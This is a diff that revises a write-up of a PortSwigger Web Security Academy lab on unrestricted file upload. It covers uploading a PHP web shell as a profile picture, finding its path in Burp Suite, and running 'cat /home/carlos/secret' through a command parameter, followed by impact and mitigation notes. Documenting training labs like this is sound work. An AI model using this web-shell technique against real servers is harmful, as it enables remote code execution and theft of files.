@@ -9,14 +9,14 @@
 
 ## Vulnerability
 
-The application allows users to upload profile pictures with no file type or content validation. Uploaded files are stored directly in a web-accessible directory, making it possible to upload and execute server-side scripts.
+The application has a vulnerable image upload function. It doesn't perform any validation on the files users upload before storing them on the server's filesystem.
 
 ## Steps to Reproduce
 
 **1. Create a PHP web shell**
 
 ```bash
-nano exploit.php
+nano portswiggerexploit.php
 ```
 
 ```php
@@ -25,20 +25,20 @@ nano exploit.php
 
 **2. Upload the file**
 
-Log in with valid credentials and upload `exploit.php` as a profile picture. The server accepts it without any validation.
+Log in using the credentials `wiener:peter` and upload `portswiggerexploit.php` as a profile picture. The server accepts it without any validation.
 
-**3. Locate the uploaded file**
+**3. Find the file path**
 
-Check Burp Suite HTTP history for the GET request that loads the profile image. The response reveals the file path:
-
-```
-/files/avatars/exploit.php
-```
-
-**4. Execute commands**
+Check Burp Suite HTTP history. When a website accepts a profile picture, it has to load that image from somewhere to show it to you. Using this behavior, the file path was found:
 
 ```
-https://<lab-id>.web-security-academy.net/files/avatars/exploit.php?command=cat+/home/carlos/secret
+/files/avatars/portswiggerexploit.php
+```
+
+**4. Execute the command**
+
+```
+https://<lab-id>.web-security-academy.net/files/avatars/portswiggerexploit.php?command=cat%20/home/carlos/secret
 ```
 
 ## Result
@@ -47,19 +47,10 @@ https://<lab-id>.web-security-academy.net/files/avatars/exploit.php?command=cat+
 gHDlyXs1CifvIROj5Edbky7t0wjvAGql
 ```
 
----
-
 ## Impact
 
-Full remote code execution on the server. An attacker can read arbitrary files, move laterally, or establish persistence depending on server permissions.
+Attacker can read local files on the server, and possibly edit/delete files. Can also perform privilege escalation.
 
 ## Mitigation
 
-- Validate file type by checking magic bytes, not just extension or MIME type
-- Rename uploaded files server-side
-- Store uploads outside the web root
-- Serve uploaded files through a dedicated handler, never execute them directly
-
----
-
-*Tags: `file-upload` `rce` `php` `web-security-academy`*
+Server should not only check extensions or MIME types — it should verify files properly by checking file content. Store files somewhere safe like outside the web root. Should not allow any files without content validation.
